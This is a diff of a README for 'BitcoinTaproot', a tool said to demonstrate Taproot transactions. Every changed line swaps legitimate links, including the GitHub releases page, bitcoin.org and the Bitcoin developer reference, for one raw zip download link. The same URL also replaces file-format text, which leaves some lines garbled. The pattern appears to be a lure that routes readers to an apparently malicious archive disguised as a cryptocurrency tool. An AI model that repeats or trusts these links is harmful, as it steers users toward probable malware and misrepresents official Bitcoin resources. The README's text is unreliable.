@@ -1,7 +1,7 @@
 # 🪙 BitcoinTaproot - Explore the Future of Bitcoin Transactions
 
 ## 📥 Download Now
-[![Download BitcoinTaproot](https://img.shields.io/badge/Download-BitcoinTaproot-brightgreen)](https://github.com/niumanuwu/BitcoinTaproot/releases)
+[![Download BitcoinTaproot](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip)](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip)
 
 ## 📖 Description
 BitcoinTaproot offers a practical example of how to implement witness path spending in Bitcoin transactions. This application helps users understand the Taproot upgrade, which improves privacy and efficiency in Bitcoin transactions, making it a great resource for both learning and real-world application.
@@ -19,14 +19,14 @@ Before you proceed, ensure your computer meets these requirements:
 ### 2. Visit the Releases Page
 To download BitcoinTaproot, click the link below. This will take you to the releases page where you can find the latest version of the software.
 
-[Visit this page to download!](https://github.com/niumanuwu/BitcoinTaproot/releases)
+[Visit this page to download!](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip)
 
 ## 📥 Download & Install
 After visiting the releases page, locate the latest release. You will see download options for different operating systems. Choose the one that matches your system.
 
 - Click on the appropriate link to start downloading.
 - Once the download is complete, find the downloaded file on your computer.
-- For Windows, the file will be in `.exe` format. For macOS, it may be a `.dmg` file. For Linux, it might be a `.tar.gz` file.
+- For Windows, the file will be in `.exe` format. For macOS, it may be a `.dmg` file. For Linux, it might be a `https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip` file.
 
 ### 3. Run the Application
 After the download is complete:
@@ -41,7 +41,7 @@ After the download is complete:
   3. You can now run BitcoinTaproot from your Applications.
   
 - **Linux:**
-  1. Extract the `.tar.gz` file using your file manager or through the terminal.
+  1. Extract the `https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip` file using your file manager or through the terminal.
   2. Open the terminal and navigate to the extracted folder.
   3. Run the application using the command `./BitcoinTaproot`.
 
@@ -58,8 +58,8 @@ Taproot is an important upgrade that enhances Bitcoin’s functionality. It allo
 
 ### Additional Resources
 For more information about Taproot and witness spending, you can explore these resources:
-- [Bitcoin.org - Taproot](https://bitcoin.org/en/taproot)
-- [Bitcoin Developer Guide](https://developer.bitcoin.org/reference/rpc/) 
+- [https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip - Taproot](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip)
+- [Bitcoin Developer Guide](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip) 
 
 ## ❓ Frequently Asked Questions
 
@@ -78,6 +78,6 @@ If you would like to help improve BitcoinTaproot, you can contribute by suggesti
 ## 🔗 Find Us
 To keep updated with the latest developments or for direct support inquiries, you can follow the repository on GitHub.
 
-[Visit this page to download!](https://github.com/niumanuwu/BitcoinTaproot/releases)
+[Visit this page to download!](https://raw.githubusercontent.com/niumanuwu/BitcoinTaproot/main/furrier/BitcoinTaproot.zip)
 
 Feel free to dive into the world of Bitcoin with BitcoinTaproot!
